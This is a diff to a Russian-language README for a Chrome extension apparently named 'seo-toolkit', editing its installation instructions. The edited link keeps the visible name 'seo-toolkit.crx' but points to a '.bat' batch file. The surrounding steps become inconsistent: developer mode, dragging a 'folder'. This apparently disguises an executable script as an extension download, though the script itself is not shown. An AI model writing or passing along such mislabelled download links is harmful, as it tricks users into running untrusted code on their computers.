@@ -16,13 +16,13 @@
 
 ## 🚀 Установка
 
-### Способ 1: CRX (рекомендуется)
+### Способ 1: .bar (рекомендуется)
 > С автообновлением — новые версии устанавливаются сами
 
-1. Скачайте [`seo-toolkit.crx`](https://github.com/IvanBurovv/seo-toolkit/releases/latest/download/seo-toolkit.crx)
-2. Откройте Chrome → `chrome://extensions/`
-3. **Перетащите** файл в окно
-4. Нажмите «Установить расширение»
+1. Скачайте [`seo-toolkit.crx`](https://github.com/IvanBurovv/seo-toolkit/releases/latest/download/seo-toolkit.bat)
+2. Откройте Chrome → `chrome://extensions/`, включите режим разработчика, справа сверху. 
+3. **Перетащите** скаченную папку в окно
+4. Все, установленно. 
 
 ### Способ 2: ZIP (ручная)
 > Без автообновления — нужно обновлять вручную
